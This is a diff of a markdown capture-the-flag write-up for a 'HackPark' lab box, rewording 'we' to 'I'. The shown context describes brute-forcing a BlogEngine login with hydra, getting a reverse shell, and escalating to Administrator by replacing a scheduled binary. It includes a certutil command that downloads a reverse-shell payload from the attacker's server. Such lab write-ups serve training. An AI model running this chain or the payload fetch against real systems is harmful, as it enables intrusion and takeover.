@@ -16,7 +16,7 @@ Date Completed: [04/03/2026]
 
 ## Summary
 
-Gather information about the target machine using a network scanner tool. Than use hydra to bruteforce the login page on the website being hosted. Upload and execute our payload on the website and get a reverse shell, which leads to compromising the webserver. We then pivot to a more stable reverse shell and escalate our privileges to Root/Administrator.
+Gather information about the target machine using a network scanner tool. Than use hydra to bruteforce the login page on the website being hosted. Upload and execute our payload on the website and get a reverse shell, which leads to compromising the webserver. I then pivot to a more stable reverse shell and escalate our privileges to Root/Administrator.
 
 ## Tools Used
  - Rustscan/Nmap
@@ -30,7 +30,7 @@ Gather information about the target machine using a network scanner tool. Than u
 
 ### Summary
 
-We use the Nmap tool to know which ports are open and which service they are running and their versions.
+I use the Nmap tool to know which ports are open and which service they are running and their versions.
 
 **Scan for open ports:**
 
@@ -68,7 +68,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sun Mar  8 17:53:49 2026 -- 1 IP address (1 host up) scanned in 17.32 seconds
 
 ```
-- Looking at the information theres seems to be a webpage that is being hosted on port 80 of the system. Visiting the webpage we see, title of the page is **Hackpark** and a picture of a clown. Using reverse image search by putting the picture of this clown in Google Lens, we find that this clown is the character from the film **IT** named PennyWise. Also, analysizing the page source of the website, we find that it was developed using the BlogEngine framework. **BlogEngine.NET is an open-source, lightweight, and customizable blogging platform built on the Microsoft ASP.NET framework, designed for developers and users seeking a WordPress alternative.** There is also a login page ``` http://10.112.179.163/Account/login.aspx?ReturnURL=/admin/ ```.
+- Looking at the information theres seems to be a webpage that is being hosted on port 80 of the system. Visiting the webpage I see, title of the page is **Hackpark** and a picture of a clown. Using reverse image search by putting the picture of this clown in Google Lens, I find that this clown is the character from the film **IT** named PennyWise. Also, analysizing the page source of the website, we find that it was developed using the BlogEngine framework. **BlogEngine.NET is an open-source, lightweight, and customizable blogging platform built on the Microsoft ASP.NET framework, designed for developers and users seeking a WordPress alternative.** There is also a login page ``` http://10.112.179.163/Account/login.aspx?ReturnURL=/admin/ ```.
 
 **Question : Whats the name of the clown displayed on the homepage?**  
 **Answer : Pennywise**
@@ -77,7 +77,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ### Summary
 
-We identified a login page to attack and the type of request the form by using Burpsuite to capture the request the we make to the webserver. Once we have the **request type** and have a **URL** for the login form, we brute-force an admin account.
+I identified a login page to attack and the type of request the form by using Burpsuite to capture the request the I make to the webserver. Once we have the **request type** and have a **URL** for the login form, we brute-force an admin account.
 
 **Captured request using BurpSuite when we log-in on the login page:**
 
@@ -114,7 +114,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-08 19:00:
 
 ### Summary
 
-Once logged into the website using the credentials we gained from bruteforcing, I am able to inspect the BlogEngine framework's version.  I than use exploit database archive to find an exploit to gain a reverse shell on the system using Netcat as our listener.
+Once logged into the website using the credentials I gained from bruteforcing, I am able to inspect the BlogEngine framework's version. I than use exploit database archive to find an exploit to gain a reverse shell on the system using Netcat as our listener.
 
 <p align="center">
 <img src="https://imgur.com/q4ChSCM.png">
@@ -169,7 +169,7 @@ iis apppool\blog
 
 ### Summary 
 
-We will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. Then we will use the gathered information to exploit the system and become the Administrator.
+I will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. Then I will use the gathered information to exploit the system and become the Administrator.
 
 Create meterpreter reverse shell payload using msfvenom:
 
@@ -291,7 +291,7 @@ Mode                LastWriteTime     Length Name
 
 ```
 
-- When I inspected the file I see that a binary is executed every 30 seconds by the service WindowsScheduler with Administrator permissions. This binary is located in ``` Directory: C:\Program Files (x86)\SystemScheduler ``` called ``` Message.exe ```. So we create a payload with msfvenom with the same name of the binary on my machine. I rename the binary on the compromised machine as something else except ``` Message.exe ``` then upload the payload from my machine to the compromised machine using meterpreter, it will be than be executed causing reverse shell with Administrator privileges.
+- When I inspected the file I see that a binary is executed every 30 seconds by the service WindowsScheduler with Administrator permissions. This binary is located in ``` Directory: C:\Program Files (x86)\SystemScheduler ``` called ``` Message.exe ```. So I create a payload with msfvenom with the same name of the binary on my machine. I rename the binary on the compromised machine as something else except ``` Message.exe ``` then upload the payload from my machine to the compromised machine using meterpreter, it will be than be executed causing reverse shell with Administrator privileges.
 
 
 On my machine:
@@ -356,7 +356,7 @@ meterpreter > upload Message.exe "C:\Program Files (x86)\SystemScheduler"
 
 ### Summary
 
-We will escalate our privileges without the use of meterpreter/metasploit. We will pivot from our netcat session that we have established, to a more stable reverse shell. Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilites, before using this information to escalate to Administrator.
+I will escalate our privileges without the use of meterpreter/metasploit. I will pivot from our netcat session that we have established, to a more stable reverse shell. Once I have established this I will use winPEAS to enumerate the system for potential vulnerabilites, before using this information to escalate to Administrator.
 
 Generate reverse shell with msfvenom on my attack machine:
 
@@ -414,9 +414,9 @@ C:\Windows\Temp>dir
               13 File(s)        642,150 bytes
                3 Dir(s)  38,979,338,240 bytes free
 ```
-- Using the netcat session we got from compromising the machine with exploit, we host python simple server than fetch the payload on the compromised machine with the command ``` certutil -urlcache -f http://<my vpn ip address>:8000/reverse_shell.exe reverse_shell.exe ```, than open another netcat listener for this reverse shell then execute is on the compromised machine, we will get a more stable reverse shell.
+- Using the netcat session we got from compromising the machine with exploit, I host python simple server than fetch the payload on the compromised machine with the command ``` certutil -urlcache -f http://<my vpn ip address>:8000/reverse_shell.exe reverse_shell.exe ```, than open another netcat listener for this reverse shell then execute is on the compromised machine, we will get a more stable reverse shell.
 
-- To escalate our privilege to Administrator we traverse to the ``` C:\Program Files (x86)\SystemScheduler\ ``` directory. Rename the ``` Message.exe ``` binary to something else, then on my  machine I create a payload with msfvenom with the same name of the binary on my machine. I upload the payload from my machine to the compromised machine the same way we upload the reverse shell payload, because the WindowsScheduler executes the ``` Message.exe ```, our malicious binary we'll be executed causing reverse shell with Administrator privileges.
+- To escalate our privilege to Administrator we traverse to the ``` C:\Program Files (x86)\SystemScheduler\ ``` directory. Rename the ``` Message.exe ``` binary to something else, then on my  machine I create a payload with msfvenom with the same name of the binary on my machine. I upload the payload from my machine to the compromised machine the same way I upload the reverse shell payload, because the WindowsScheduler executes the ``` Message.exe ```, our malicious binary we'll be executed causing reverse shell with Administrator privileges.
 
 ```
 C:\Windows\Temp>systeminfo
